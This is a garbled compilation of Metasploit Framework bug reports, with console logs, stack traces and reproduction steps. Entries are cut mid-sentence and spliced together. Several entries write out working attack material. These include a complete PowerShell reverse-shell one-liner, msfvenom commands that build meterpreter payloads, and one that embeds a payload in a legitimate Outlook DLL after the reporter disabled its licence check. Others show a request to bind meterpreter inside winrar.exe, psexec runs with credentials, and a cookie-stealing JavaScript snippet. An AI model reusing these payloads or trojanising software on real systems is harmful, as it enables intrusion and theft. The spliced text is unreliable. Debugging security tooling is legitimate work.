[-] /home/jqian/rapid7/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /home/jqian/rapid7/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] auxiliary module execution completed
``` ## system stuff
i found that a password containing the "@" character causes a false positive result when running the auxiliary/scanner/snmp/snmp_login module
this was apparent when i ran the module with the default password list of "/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt" and found all systems running snmp on the network had two default passwords for a private string
when reviewing the default password file, i discovered that the two passwords shown to be valid had some special characters in common
by adding a few passwords to the file, with various special character combinations, demonstrated that any password with a "@" added showed as a "login successful:"
i could prove these were false positives by simply trying to login with the passwords
[+] 10.0.1.1:161 - login successful: s!a@m#n$p%c (access level: read-only); proof (sysdescr.0): [+] 10.0.1.1:161 - login successful: nogah$@! (access level: read-only); proof (sysdescr.0): [+] 10.0.1.1:161 - login successful: some@thingelse (access level: read-only); proof (sysdescr.0): [+] 10.0.1.1:161 - login successful: someth@ing (access level: read-only); proof (sysdescr.0): rsions.
`run auxiliary/scanner/http/dolibarr_login`
`set rhosts 127.0.0.1`
msf auxiliary(dolibarr_login) > run [*] trying "connect:connect"
[-] auxiliary failed: nameerror undefined local variable or method `get_cookies' for #<msf::modules::mod617578696c696172792f7363616e6e65722f687474702f646f6c69626172725f6c6f67696e::metasploitmodule: >
did you mean? get_client
[-] call stack:
[-] /home/jqian/rapid7/metasploit-framework/modules/auxiliary/scanner/http/dolibarr_login.rb:49:in `get_sid_token'
[-] /home/jqian/rapid7/metasploit-framework/modules/auxiliary/scanner/http/dolibarr_login.rb:91:in `do_login'
[-] /home/jqian/rapid7/metasploit-framework/modules/auxiliary/scanner/http/dolibarr_login.rb:147:in `block in run_host'
[-] /home/jqian/rapid7/metasploit-framework/lib/msf/core/auxiliary/auth_brute.rb:197:in `block in each_user_pass'
[-] /home/jqian/rapid7/metasploit-framework/lib/msf/core/auxiliary/auth_brute.rb:178:in `each'
[-] /home/jqian/rapid7/metasploit-framework/lib/msf/core/auxiliary/auth_brute.rb:178:in `each_user_pass'
[-] /home/jqian/rapid7/metasploit-framework/modules/auxiliary/scanner/http/dolibarr_login.rb:145:in `run_host'
[-] /home/jqian/rapid7/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:135:in `block (2 levels) in run'
[-] /home/jqian/rapid7/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] auxiliary module execution completed
``` ## system stuff
`use auxiliary/scanner/http/concrete5_member_list`
`set rhosts 127.0.0.1`
and notice the username in the output could be garbled
msf auxiliary(concrete5_member_list) > run [+] 127.0.0.1:80 extracted 1 entries concrete5 members
================= userid username profile ------ -------- ------- 123 john</a></div><div class="ccm-profile-member-username">/view/345/<a href="profiles/345">mary profiles/123">john</a></div><div class="ccm-profile-member-username">/view/345/<a href="profiles/345 [*] scanned 1 of 1 hosts (100% complete)
error output when press enter on exploit/multi/handler the meterpreter session work right but i would like know what depend this error .
rsions.
msf > use auxiliary/scanner/http/cisco_ironport_enum
msf auxiliary(cisco_ironport_enum) >run rhost 127.0.0.1
msf auxiliary(cisco_ironport_enum) > run [+] 127.0.0.1:443 - server is responsive...
[-] 127.0.0.1:443 - connection failed, aborting...
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
this module has the default rport as 443 but the ssl is not turned on by default
so when running it, it will send plain http to server port 443
msf > use auxiliary/scanner/http/cisco_nac_manager_traversal
msf auxiliary(cisco_nac_manager_traversal) > show options module options (auxiliary/scanner/http/cisco_nac_manager_traversal): name current setting required description ---- --------------- -------- ----------- file /etc/passwd yes the file to traverse for maxdirs 7 yes the maximum directory depth to search proxies no a proxy chain of format type:host:port[,type:host:port][...] rhosts 127.0.0.1 yes the target address range or cidr identifier rport 443 yes the target port ssl false no negotiate ssl/tls for outgoing connections threads 1 yes the number of concurrent threads vhost no http server virtual host
``` rsions.
msf > use auxiliary/scanner/http/owa_login
msf auxiliary(owa_login) > setg rhost 127.0.0.1
rhost => 127.0.0.1
msf auxiliary(owa_login) > set userpass_file userpass.lst
userpass_file => userpass.lst
msf auxiliary(owa_login) > run [*] 127.0.0.1:443 owa - testing version owa_2013
[*] auxiliary module execution completed
msf auxiliary(owa_login) > run [*] 127.0.0.1:443 owa - testing version owa_2013
[-] 127.0.0.1:443 - [1/3] - http connection timeout
[-] 127.0.0.1:443 - [1/3] - http connection timeout
[-] 127.0.0.1:443 - [1/3] - http connection timeout
[-] 127.0.0.1:443 - [1/3] - http connection timeout
[-] 127.0.0.1:443 - [1/3] - http connection timeout
[-] 127.0.0.1:443 - [1/3] - http connection timeout
[-] 127.0.0.1:443 - [1/3] - http connection timeout
[-] 127.0.0.1:443 - [1/3] - http connection timeout
[*] auxiliary module execution completed
msf auxiliary(blind_sql_query) > use auxiliary/scanner/http/cisco_asa_asdm
msf auxiliary(cisco_asa_asdm) > setg rhosts 127.0.0.1
msf auxiliary(cisco_asa_asdm) > run [+] server is responsive...
[-] application does not appear to be cisco asa asdm
module will not continue.
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
msf > use auxiliary/scanner/http/buffalo_login
msf auxiliary(buffalo_login) > show options module options (auxiliary/scanner/http/buffalo_login): name current setting required description ---- --------------- -------- ----------- blank_passwords false no try blank passwords for all users bruteforce_speed 5 yes how fast to bruteforce, from 0 to 5 db_all_creds false no try each user/password couple stored in the current database db_all_pass false no add all passwords in the current database to the list db_all_users false no add all users in the current database to the list password no a specific password to authenticate with pass_file no file containing passwords, one per line proxies no a proxy chain of format type:host:port[,type:host:port][...] rhost yes the target address rhosts yes the target address range or cidr identifier rport 80 yes the target port ssl false no negotiate ssl/tls for outgoing connections stop_on_success false yes stop guessing when a credential works for a host threads 1 yes the number of concurrent threads username no a specific username to authenticate as userpass_file no file containing users and passwords separated by space, one pair per line user_as_pass false no try the username as the password for all users user_file no file containing usernames, one per line verbose true yes whether to print output for all attempts vhost no http server virtual host
``` rsions.
msf auxiliary(bmc_trackit_passwd_reset) > use auxiliary/scanner/http/brute_dirs
msf auxiliary(brute_dirs) > show missing module options (auxiliary/scanner/http/brute_dirs): name current setting required description ---- --------------- -------- ----------- msf auxiliary(brute_dirs) > run [-] auxiliary failed: nameerror undefined local variable or method `emesg' for #<msf::modules::mod617578696c696172792f7363616e6e65722f687474702f62727574655f64697273::metasploitmodule: >
did you mean? emesg
[-] call stack:
[-] /home/jqian/rapid7/metasploit-framework/modules/auxiliary/scanner/http/brute_dirs.rb:100:in `block in run_host'
[-] /home/jqian/rapid7/metasploit-framework/modules/auxiliary/scanner/http/brute_dirs.rb:70:in `each'
[-] /home/jqian/rapid7/metasploit-framework/modules/auxiliary/scanner/http/brute_dirs.rb:70:in `run_host'
[-] /home/jqian/rapid7/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:134:in `block (2 levels) in run'
[-] /home/jqian/rapid7/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] auxiliary module execution completed
setg rhosts file:test2/21.txt
setg threads 255
setg rport 21
use auxiliary/scanner/ftp/colorado_ftp_traversal
with database connected, use
`search type:auxiliary name:mysql`
you get all results for 'auxiliary' (first keyword) workaround is to disconnect the database and use a slow search
msf auxiliary(tcp) > db_disconnect
msf auxiliary(tcp) > search type:auxiliary name:mysql
[!] module database cache not built yet, using slow search matching modules
================ name disclosure date rank description ---- --------------- ---- ----------- auxiliary/admin/mysql/mysql_enum normal mysql enumeration module auxiliary/admin/mysql/mysql_sql normal mysql sql generic query auxiliary/analyze/jtr_mysql_fast normal john the ripper mysql password cracker (fast mode) auxiliary/scanner/mysql/mysql_authbypass_hashdump 2012-06-09 normal mysql authentication bypass password dump auxiliary/scanner/mysql/mysql_file_enum normal mysql file/directory enumerator auxiliary/scanner/mysql/mysql_hashdump normal mysql password hashdump auxiliary/scanner/mysql/mysql_login normal mysql login utility auxiliary/scanner/mysql/mysql_schemadump normal mysql schema dump auxiliary/scanner/mysql/mysql_version normal mysql server version enumeration auxiliary/scanner/mysql/mysql_writable_dirs normal mysql directory write test auxiliary/server/capture/mysql normal authentication capture: mysql
``` again, the problem is that with the database connected, i receive all matches from the first search keyword
this happens even after i rebuild the database
windows 2003 server i was trying to use wab32res.dll from outlook as the template to create a payload in which the outlook address book would still load, however, i hit the warbird check
msfvenom -p windows/shell/reverse_tcp -x /root/desktop/wab32res.dll -f dll -k -o /var/www/html/reverse4.dll lhost=192.168.100.13 lport=8888 exitfunc=thread no platform was selected, choosing msf::module::platform::windows from the payload no arch selected, selecting arch: x86 from the payload found 1 compatible encoders attempting to encode payload with 0 iterations of generic/none generic/none chosen with final size 354 payload size: 354 bytes error: the template to inject to appears to have license verification (warbird) i commented out the warbird check and the payload generated successfully and worked, however, this probably should be looked into
windows server 2003 standard c:\\program files\\common files\\system\\wab32res.dll
md5: ef8c3c2ab3d91c7f46b17969c1fbc5a0
hi i always use msfvenom with meterpreter payload and with some encoders for binder i use easybinder so i ask with msfvenom i can binder for example inside winrar.exe the payload and while execute winrar open ? i try to use option -x and -k i have meterpreter session but winrar don t want open
i use wine for open it at the end but first taht i use msfvenom he open so think no is problem about wine
we discovered this the hard way after our pentest team performed an internal intrusion test and our customer had to reboot a few servers due to excessive cpu usage
i have a reduced test case with an up to date metasploit and windows 2008r2 x64
this is a screenshot of what's happening:
[screenshot](
use exploit/windows/smb/psexec
set rhost 192.168.2.124
set smbuser administrator
set smbdomain win2008
set smbpass password2!
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.1.223
set exitfunc process # happens with 'thread' too.
``` from this point, i managed to trigger the behavior with two ways:
this may mimick well what may have happened during our pentest, when some bounce hosts had their meterpreter session cut off
^c (during "[*] sending stage (1189423 bytes) to 192.168.2.124")
run (new meterpreter may fail to spawn, probably the service wasn't cut off properly)
``` rsions.
set up any linux target machine (i used ubuntu 16.04)
generate a key file that is 4096b long to use
$ ssh-keygen -t rsa -b 4096
generating public/private rsa key pair.
enter file in which to save the key (/home/nick/.ssh/id_rsa):
enter passphrase (empty for no passphrase):
enter same passphrase again:
your identification has been saved in /home/nick/.ssh/id_rsa.
your public key has been saved in /home/nick/.ssh/id_rsa.pub.
the key fingerprint is:
sha256:mr9stupz+8t3euujrullmw+ni3fycenklailinnxk4o nick@scholar
the key's randomart image is:
+---[rsa 4096]----+
| o +obb*=oo|
| +.+=+=@o.|
| e = +o+o|
+----[sha256]-----+
ensure the newly generated key is in the target host's known authorised_keys file
create and execute the payload with the specified keyfile
msf > use auxiliary/scanner/ssh/ssh_login_pubkey
msf auxiliary(ssh_login_pubkey) > set key_path <directory with key file>
key_path => <directory with key file>
msf auxiliary(ssh_login_pubkey) > set rhosts <target host>
rhosts => <target host>
msf auxiliary(ssh_login_pubkey) > set username <username on target host>
username => <username on target host>
msf auxiliary(ssh_login_pubkey) > run
use exploit/windows/browser/mswhale_checkforupdates
set uripath /msf
make a http get request from a remote pc to msf:
see unhandled exception on line [98]( #l98):
nomethoderror: undefined method `opts' for #<string: > some other modules are also seem to be affected:
exploit/windows/browser/baofeng_storm_onbeforevideodownload
exploit/windows/browser/symantec_altirisdeployment_runcmd
exploit/windows/browser/ibmegath_getxmlvalue
setup timeserver code from on a recent debian jessie with ruby 2.1.5
use $safe = 1
run exploit/linux/misc/drb_remote_codeexec against this target
the fastest way to reproduce this is: ```
use exploit/windows/smb/psexec
set rhost xxx.xxx.xxx.xxx
set smbdomain
set smbuser
show options
``` example: ```
msf exploit(psexec) > show options module options (exploit/windows/smb/psexec): name current setting required description ---- --------------- -------- ----------- rhost xxx.xxx.xxx.xx yes the target address rport 445 yes the smb service port service_description no service description to to be used on target for pretty listing service_display_name no the service display name service_name no the service name share admin$ yes the share to connect to, can be an admin share (admin$,c$,...) or a normal read/write folder share smbdomain no the windows domain to use for authentication smbuser no the username to authenticate as
``` check the column width of the columns containing unicode in the output
looking at it, it appears that there is a predictable lack of spaces- namely, there needs to be one space added for each unicode character
likely, this is because when the padding is calculated, it relies on bytes rather than the number of chars
i notice this on both the `show options` and when i do db output like: ```
msf exploit(psexec) > hosts hosts
===== address mac name os_name os_flavor os_sp purpose info comments
------- --- ---- ------- --------- ----- ------- ---- --------
xxx.xxx.xxx.xx g windows 10 pro client xxx.xxx.xxx.xx windows 2012 r2 standard server xxx.xxx.xxx.xx desktop-oqbo9p9 windows 10 pro client xxx.xxx.xxx.xx computer windows 2012 r2 standard server xxx.xxx.xxx.xx a-9ef3c1e7fef64 windows 2000 server xxx.xxx.xxx.xx test-8343845b47 windows xp client ``` it is minor, but annoying
it might also be a fun project for someone looking to get into metasploit
linux ubuntu 4.4.0-45-generic #66-ubuntu smp wed oct 19 14:12:37 utc 2016 x86_64 x86_64 x86_64 gnu/linux
commit 9672759be88380a50e4836fb01f7551123a57506
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set payload linux/x86/meterpreter/reverse_tcp
set lhost 10.11.0.xx
set lport 5555
set rhost 10.11.1.xx
set targeturi /cgi-bin/test.cgi
set timeout 15
exploit ```
[*] started reverse tcp handler on 10.11.0.xx:5555 [*] command stager progress - 100.60% done (837/832 bytes)
[*] exploit completed, but no session was created.
create new meterpreter sessions
interact with the sessions `sessions -i 1`
send session to background
use `run_cmd` from metasploit irb console (for example `framework.sessions[1].run_cmd("ps")`) without interacting with the session (step 2 and 3), everything works fine
service postgresql start
msf> db_import targetfilename.xml
import successful rsions.
start local server > use ie_uxss_injection > set target_uri > run [_] using url: [_] local ip: [*] server started.
visit generated url
server sends a malicious content conatining base64 js code: `var e = document.createelement('img'); e.src=' + encodeuricomponent(document.cookie); ` as you can see, colon isn't followed by a port number as it should be to fix it you should set uriport explicitly > set uriport 0
> var e = document.createelement('img'); e.src=' + encodeuricomponent(document.cookie);
so i started the autopwn2 module with these configurations
> use auxiliary/server/browser_autopwn2
> set verbose true
> set showexploitlist true
> set uripath test
> > searching bes exploits, please wait...
> starting exploit modules...
> starting listeners...
> time spent: 14.182648369
> starting the payload handler...
> using url:
> local ip:
> the following is a list of exploits that browserautopwn will consider using.
> exploits with the highest ranking and newest will be tried first.
> starting the payload handler...
> please use the following url for the browser attack:
> browserautopwn url:
> server started
now i used a test android phone
i used the default browser and got this result: > received cookie 'iwwhffgtywnnnofdmzeb' from 192.168.1.112
> gathering target information for 192.168.1.112
> sending html response to 192.168.1.112
> info receiver page called from 192.168.1.112
> received cookie 'mvcwgurtqloeorz' from 192.168.1.112
> received sniffed browser data over post from 192.168.1.112
> {"os_name"=>["android"], "os_vendor"=>["undefined"], "os_device"=>["undefined"], "ua_name"=>["safari"], "ua_ver"=>["4.0"], "arch"=>["armle"], "java"=>["null"], "silverlight"=>["false"], "flash"=>["null"], "vuln_test"=>["true"]}.
> received cookie 'mvcwgurtqloeorz' from 192.168.1.112
> serving exploit to user 192.168.1.112 with tag mvcwgurtqloeorz
> setting target "mvcwgurtqloeorz" to :tried.
> received cookie 'mvcwgurtqloeorz' from 192.168.1.112
> exploits found suitable for 192.168.1.112 (tag: mvcwgurtqloeorz)
> > order ip exploit
> > 1 192.168.1.112 webview_addjavascriptinterface
> 2 192.168.1.112 samsung_knox_smdm_url
> > received cookie 'mvcwgurtqloeorz' from 192.168.1.112
> received cookie 'mvcwgurtqloeorz' from 192.168.1.112
> serving exploit to user 192.168.1.112 with tag mvcwgurtqloeorz
> setting target "mvcwgurtqloeorz" to :tried.
> comparing requirement: source=script vs source=script
> comparing requirement: os_name=(?-mix:^(?:google )?android) vs os_name=android
> comparing requirement: vuln_test=true vs vuln_test=true
> serving armle exploit...
> received cookie 'mvcwgurtqloeorz' from 192.168.1.112
> received cookie 'mvcwgurtqloeorz' from 192.168.1.112
> serving exploit to user 192.168.1.112 with tag mvcwgurtqloeorz
> setting target "mvcwgurtqloeorz" to :tried.
> comparing requirement: source=script vs source=script
> comparing requirement: os_name=(?-mix:^(?:google )?android) vs os_name=android
> serving exploit..
so my test phone isn't vulnerable to this exploits but the browser requirements where met so these possible exploits got choosen
now the problem begins to shine
normally if i would for example start the webview exploit as standalone job it would send a vulnerability test as js code
and it would turn out that my device is not vulnerable and let it in peace
but in autopwn2 it doesn't send this js code and automatically thinks it returned true
## system stuff i am running lubuntu with the community installer
the version of it is:
framework: 4.12.25-dev
console : 4.12.25-dev
# ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
no assembly installation was found.
from @mubix on irc: ```
[01:10:17] <@mubix> error:14090086:ssl routines:ssl3_get_server_certificate:certificate verify failed in command line code on line 1
[01:10:29] <@mubix> thats what i get using web_delivery for php
try to create an encoded payload (e.g
`./msfvenom -p windows/meterpreter/bind_tcp -e x86/nonupper -f c`)
hit the following error: ```
$ ./msfvenom -p windows/meterpreter/bind_tcp -e x86/nonupper -f c
no platform was selected, choosing msf::module::platform::windows from the payload
no arch selected, selecting arch: x86 from the payload
found 1 compatible encoders
attempting to encode payload with 1 iterations of x86/nonupper
x86/nonupper failed with encoding failed due to a nil character
error: an encoding exception occurred.
run the following rc script, which iterates through many of the ssh-using modules, observe failures: ```
setg rhosts 127.0.0.1
setg rhost 127.0.0.1
setg rport 22
setg username bcook
setg key_file ~/.ssh/authorized_keys use auxiliary/scanner/ssh/apache_karaf_command_execution
use auxiliary/scanner/ssh/ssh_identify_pubkeys
use exploit/apple_ios/ssh/cydia_default_ssh
use exploit/linux/ssh/ceragon_fibeair_known_privkey
use exploit/linux/ssh/exagrid_known_privkey
use exploit/linux/ssh/f5_bigip_known_privkey
use exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey
use exploit/linux/ssh/quantum_dxi_known_privkey
use exploit/linux/ssh/quantum_vmpro_backdoor
use exploit/linux/ssh/symantec_smg_ssh
use exploit/unix/ssh/array_vxag_vapv_privkey_privesc
use exploit/unix/ssh/tectia_passwd_changereq
resource (test.rc)> setg rhosts 127.0.0.1
rhosts => 127.0.0.1
resource (test.rc)> setg rhost 127.0.0.1
rhost => 127.0.0.1
resource (test.rc)> setg rport 22
rport => 22
resource (test.rc)> setg username bcook
username => bcook
resource (test.rc)> setg key_file ~/.ssh/authorized_keys
key_file => ~/.ssh/authorized_keys
resource (test.rc)> use auxiliary/scanner/ssh/apache_karaf_command_execution
resource (test.rc)> run
[*] 127.0.0.1:22 - attempt to login...
[-] auxiliary failed: argumenterror invalid option(s): disable_agent, record_auth_info
[-] call stack:
[-] /users/bcook/.rvm/gems/ruby-2.3.1@metasploit-framework/gems/net-ssh-3.2.0/lib/net/ssh.rb:204:in `start'
[-] /users/bcook/rapid7/metasploit-framework/modules/auxiliary/scanner/ssh/apache_karaf_command_execution.rb:89:in `block in do_login'
[-] /users/bcook/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:91:in `block in timeout'
[-] /users/bcook/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:33:in `block in catch'
[-] /users/bcook/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:33:in `catch'
[-] /users/bcook/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:33:in `catch'
[-] /users/bcook/.rvm/rubies/ruby-2.3.1/lib/ruby/2.3.0/timeout.rb:106:in `timeout'
[-] /users/bcook/rapid7/metasploit-framework/modules/auxiliary/scanner/ssh/apache_karaf_command_execution.rb:88:in `do_login'
[-] /users/bcook/rapid7/metasploit-framework/modules/auxiliary/scanner/ssh/apache_karaf_command_execution.rb:119:in `run_host'
[-] /users/bcook/rapid7/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:134:in `block (2 levels) in run'
[-] /users/bcook/rapid7/metasploit-framework/lib/msf/core/thread_manager.rb:100:in `block in spawn'
[*] auxiliary module execution completed
resource (test.rc)> use auxiliary/scanner/ssh/ssh_identify_pubkeys
resource (test.rc)> run
[-] 127.0.0.1:22 ssh - no valid keys found
[-] 127.0.0.1:22 ssh - no valid keys found
[-] 127.0.0.1:22 ssh - no valid cleartext keys found
[*] 127.0.0.1:22 ssh - trying 0 cleartext key per user.
[*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
resource (test.rc)> use exploit/apple_ios/ssh/cydia_default_ssh
resource (test.rc)> run
[*] 127.0.0.1:22 - attempt to login as 'root' with password 'alpine'
[-] exploit failed: nameerror undefined local variable or method `ssh_socket_factory' for #<msf::modules::mod6578706c6f69742f6170706c655f696f732f7373682f63796469615f64656661756c745f737368::metasploitmodule: >
[*] exploit completed, but no session was created.
resource (test.rc)> use exploit/linux/ssh/ceragon_fibeair_known_privkey
resource (test.rc)> run
[-] exploit failed: argumenterror invalid option(s): msframework, msfmodule, record_auth_info
[*] exploit completed, but no session was created.
resource (test.rc)> use exploit/linux/ssh/exagrid_known_privkey
resource (test.rc)> run
[-] exploit failed: nameerror undefined local variable or method `ssh_socket_factory' for #<msf::modules::mod6578706c6f69742f6c696e75782f7373682f657861677269645f6b6e6f776e5f707269766b6579::metasploitmodule: >
did you mean? ssh_socket
[*] exploit completed, but no session was created.
resource (test.rc)> use exploit/linux/ssh/f5_bigip_known_privkey
resource (test.rc)> run
[-] exploit failed: argumenterror invalid option(s): msframework, msfmodule, record_auth_info
[*] exploit completed, but no session was created.
resource (test.rc)> use exploit/linux/ssh/loadbalancerorg_enterprise_known_privkey
resource (test.rc)> run
[-] exploit failed: argumenterror invalid option(s): record_auth_info
[*] exploit completed, but no session was created.
resource (test.rc)> use exploit/linux/ssh/quantum_dxi_known_privkey
resource (test.rc)> run
[-] exploit failed: argumenterror invalid option(s): record_auth_info
[*] exploit completed, but no session was created.
resource (test.rc)> use exploit/linux/ssh/quantum_vmpro_backdoor
resource (test.rc)> run
[*] 127.0.0.1:22 - attempt to login...
[-] exploit failed: argumenterror invalid option(s): record_auth_info
[*] exploit completed, but no session was created.
resource (test.rc)> use exploit/linux/ssh/symantec_smg_ssh
resource (test.rc)> run
[*] 127.0.0.1:22 - attempt to login...
[-] exploit failed: argumenterror invalid option(s): record_auth_info
[*] exploit completed, but no session was created.
resource (test.rc)> use exploit/unix/ssh/array_vxag_vapv_privkey_privesc
resource (test.rc)> run
[*] started reverse tcp double handler on 127.0.0.1:4444
[*] 127.0.0.1:22 - attempt to login with 'sync:ssh private key'
[-] exploit failed: argumenterror invalid option(s): record_auth_info
[*] exploit completed, but no session was created.
resource (test.rc)> use exploit/unix/ssh/tectia_passwd_changereq
resource (test.rc)> run
[-] 127.0.0.1:22 - 127.0.0.1:22 - this host does not use password method authentication
[*] exploit completed, but no session was created.
set up a `reverse_*` handler of some kind (i used to `reverse_https`) that's x86 and has `exitonsession` set to `false`
kick it off with `run -j`.
create a matching payload/binary.
execute the payload/binary on an x64 system, get a session.
check to make sure `sysinfo` says `meterpreter : x86/win32`.
run `uuid` to see the current uuid details
migrate the session to an x64 process.
run `sysinfo` again and notice it changes to `meterpreter : x64/win64`.
run `uuid` and notice that the architecture returned is still `x86=1/windows=1` as it was before.
put the session to sleep for 1 second using `sleep 1`.
wait for the session to come back, and interact with it.
run `sysinfo` again and notice that we now have `meterpreter : x86/win32` again.
run `uuid` and we still have the same details
at this point we have mixed architecture things going on, which can result in bad things happening
if the user loads an extension at this point, they will see crashing happening as x86 binaries are thrown at x64 sessions.
## suggested approach i think we should:
make sure we update the uuid when migrating so that the arch matches.
validate the uuid when stageless sessions are received, and/or immediately after staged sessions have finished loading their first stage
if in doubt, we should always ask meterp instead of trying to keep track of it at the msf side
ping @hdm and @busterb since we chatted on irc about it
tl;dr, if you use the exploit/multi/script/web_delivery module, specify the psh target and set ssl to true, the framework will generate a psh stager with a syntax error because it is missing a semi-colon after the "[net.servicepointmanager]::servercertificatevalidationcallback = {$true}" call
use exploit/multi/web_delivery module
set ssl to true
specify a payload (i used windows/meterpreter/reverse_https) /w required options (lhost,lport etc)
run the module
copy the psh stager code that it generates
on a windows box /w powershell installed (i tested with /w win 8.1 64 bit enterprise), open a cmd prompt and paste the psh stager code, but remove the "-w hidden" argument so that you can see the error that powershell will generate).
execute the psh stager from cmd prompt and observe the error
it should be a quick fix by just having the framework insert a semi-colon after the "[net.servicepointmanager]::servercertificatevalidationcallback = {$true}" call
manually placing a semi-colon resolves this issue and the psh stager is executed.
1 generate a `cmd/windows/reverse_powershell` payload ```
% ~/opt/metasploit-framework/msfvenom -p cmd/windows/reverse_powershell lhost=172.17.24.1 lport=4444
no platform was selected, choosing msf::module::platform::windows from the payload
no arch selected, selecting arch: cmd from the payload
no encoder or badchars specified, outputting raw payload
payload size: 1200 bytes
powershell -w hidden -nop -c function rsc{if ($c.connected -eq $true) {$c.close()};if ($p.exitcode -ne $null) {$p.close()};exit;};$a='172.17.24.1';$p='4444';$c=new-object system.net.sockets.tcpclient;$c.connect($a,$p);$s=$c.getstream();$nb=new-object system.byte[] $c.receivebuffersize;$p=new-object system.diagnostics.process;$p.startinfo.filename='cmd.exe';$p.startinfo.redirectstandardinput=1;$p.startinfo.redirectstandardoutput=1;$p.startinfo.useshellexecute=0;$p.start();$is=$p.standardinput;$os=$p.standardoutput;start-sleep 1;$e=new-object system.text.asciiencoding;while($os.peek() -ne -1){$o += $e.getstring($os.read())};$s.write($e.getbytes($o),0,$o.length);$o=$null;$d=$false;$t=0;while (-not $d) {if ($c.connected -ne $true) {rsc};$pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.length)) {$r=$s.read($nb,$pos,$nb.length - $pos);$pos+=$r;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}};if ($pos -gt 0){$str=$e.getstring($nb,0,$pos);$is.write($str);start-sleep 1;if ($p.exitcode -ne $null){rsc}else{$o=$e.getstring($os.read());while($os.peek() -ne -1){$o += $e.getstring($os.read());if ($o -eq $str) {$o=''}};$s.write($e.getbytes($o),0,$o.length);$o=$null;$str=$null}}else{rsc}};
``` 2 start a handler ```
% ~/opt/metasploit-framework/msfconsole -q -x 'use exploit/multi/handler; set payload cmd/windows/reverse_powershell; set lhost 172.17.24.1; set lport 4444; set exitonsession false; exploit -j'
payload => cmd/windows/reverse_powershell
lhost => 172.17.24.1
lport => 4444
exitonsession => false
[*] exploit running as background job
[*] started reverse tcp handler on 172.17.24.1:4444
msf exploit(handler) > [*] starting the payload handler...
``` 3 pop `cmd.exe` on windows 10 pro x64, paste the payload
my windows 10 lab box is relatively up to date, i can look more in to its exact patch level if it's relevent
4 shell rolls on in
msf exploit(handler) > [*] command shell session 1 opened (172.17.24.1:4444 -> 172.17.24.133:2501) at 2016-09-09 21:31:12 +1000 msf exploit(handler) > sessions -i 1
[*] starting interaction with 1..
microsoft windows [version 10.0.10586]
(c) 2015 microsoft corporation
all rights reserved
c:\\users\\justin>exit [*] 172.17.24.133 - command shell session 1 closed
reason: died from eoferror
``` the victim machine's cpu is fine
`powershell.exe` dies
5 repeat step 3 6 shell rolls on in
kill it with `^c`
msf exploit(handler) > [*] command shell session 3 opened (172.17.24.1:4444 -> 172.17.24.133:2503) at 2016-09-09 21:33:45 +1000 msf exploit(handler) > sessions -i 3
[*] starting interaction with 3..
microsoft windows [version 10.0.10586]
(c) 2015 microsoft corporation
all rights reserved
c:\\users\\justin>^c
abort session 3? [y/n] y [*] 172.17.24.133 - command shell session 3 closed
reason: user exit
``` victim's cpu hits 100%
`powershell.exe` sticks around and thrashes a core
process explorer indicates that the guilty thread's start address is `clr.dll!loghelp_logassert+ ` ![2016-09-09-214924_812x1073_session_cpu_100](
i'm attempting to run an auxiliary/scanner/smb/smb_login with a cport defined e.g
this issue pertains to the following payloads:
/windows/x64/meterpreter/reverse_http
/windows/x64/meterpreter/reveres_https creating reverse_http payload and handler
msfvenom -p windows/x64/meterpreter/reverse_http lhost=[public ip of handler] lport=80 -a x86_64 -f exe -o /root/test/test-http.exe
use exploit/multi/handler set payload windows/x64/meterpreter/reverse_http set lhost [public ip of listening system set lport 80 exploit -j
creating reverse_https payload and handler
msfvenom -p windows/x64/meterpreter/reverse_https lhost=[public ip of handler] lport=443 -a x86_64 -f exe -o /root/test/test-https.exe
use exploit/multi/handler set payload windows/x64/meterpreter/reverse_https set lhost [public ip of listening system] set lport 443 exploit -j rsions.
pivot a route over a meterpreter session
execute ssh_login scanner module against a routed host with a working ssh service
> use exploit/unix/webapp/wp_ninja_forms_unauthenticated_file_upload
> set form_path /contact-us
> set rhost domain.com
> set targeturi /wp
> run [_] started reverse tcp handler on 192.168.1.6:4444 [_] domain.com:80 - enabling vulnerable v3 functionality...
[-] domain.com:80 - exploit aborted due to failure: unreachable: failed to enable the vulnerable v3 functionality
[*] exploit completed, but no session was created
msfvenom -p windows/x64/shell_reverse_tcp -f exe lhost=127.0.1.1 lport=8080 prependmigrate=true > crashes.exe
in one windows cmd window ncat.exe -lvp 8080
in another windows cmd window crashes.exe
17:57:45 default j:0 s:2 auxiliary(ipidseq) > use auxiliary/scanner/ip/ipidseq
17:57:46 default j:0 s:2 auxiliary(ipidseq) > set rhosts 10.0.0.50
17:57:52 default j:0 s:2 auxiliary(ipidseq) > run [*] error: 10.0.0.50: errno::einval invalid argument - sendto(2) for "8.8.8.8" port [*] scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
everything functions properly for an undetermined period of time
active connections are made to the listeners and i am able to interact with them as expected
randomly the listeners will stop accepting connections
occasionally i will see one last session attempt to connect only to be closed for being invalid
metasploit will show no indication that anything is wrong
the jobs list still show them as running, as does the threads list
the web server also still works, serving the payload as expected
i've tried to replicate the problem, but have had no luck
the last time it happened after ~3 hours of uptime and handling 4 sessions
the time before that it happened after 5 days of uptime and handling over 40 sessions
i also noticed netstat showed a lot of the no longer active sessions still had established connections.
## error log snippets ```
[07/13/2016 13:11:17] [e(0)] core: the accept() returned nil in stream server listener monitor: #<socket:fd 24>
